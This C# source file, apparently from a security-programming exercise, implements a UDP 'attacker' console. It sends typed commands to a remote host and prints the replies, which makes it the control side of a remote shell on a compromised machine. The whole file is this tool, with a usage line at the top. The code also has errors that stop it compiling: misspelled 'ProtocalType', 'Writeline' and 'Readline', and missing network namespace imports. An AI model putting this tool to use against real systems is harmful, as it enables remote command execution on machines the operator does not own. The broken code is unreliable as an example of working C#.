//use udp_attacker like so /tmp/udp_attacker.exe 192.168.1.3 4444
using System;

namespace ch1_udp_attacker {

  class MainClass {

    static void Main(string[] args) {
      int lport = int.Parse(args[1]);

      using (UdpClient listener = new UdpClient(lport)) {
        IPEndPoint localEP = new IPEndPoint(IPAddress.Any, lport);
        string output;
        byte[] bytes;

        using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocalType.Udp)) {
          IPAddress addr = IPAddress.Parse(args[0]);
          IPEndPoint addrEP = new IPEndPoint(addr, lport);
          Console.Writeline ("Enter command to send, or a blank line to quit");

          while (true) {
            string command = Console.Readline();
            byte[] buff = Encoding.ASCII.GetBytes(command);

            try {
              sock.SendTo(buff, addrEP);

              if (string.IsNullOrEmpty(command)) {
                sock.Close();
                listener.Close();
                return;
              }

              if (string.IsNullOrWhiteSpace(command))
                continue;

              bytes = listener.Receive(ref localEP);
              output = Encoding.ASCII.GetString(bytes, 0, bytes.Length);
              Console.WriteLine(output);
            } catch(Exception ex) {
              Console.WriteLine("Exception {0}", ex.Message);
            }
          }
        }
      }
    }
  }
}
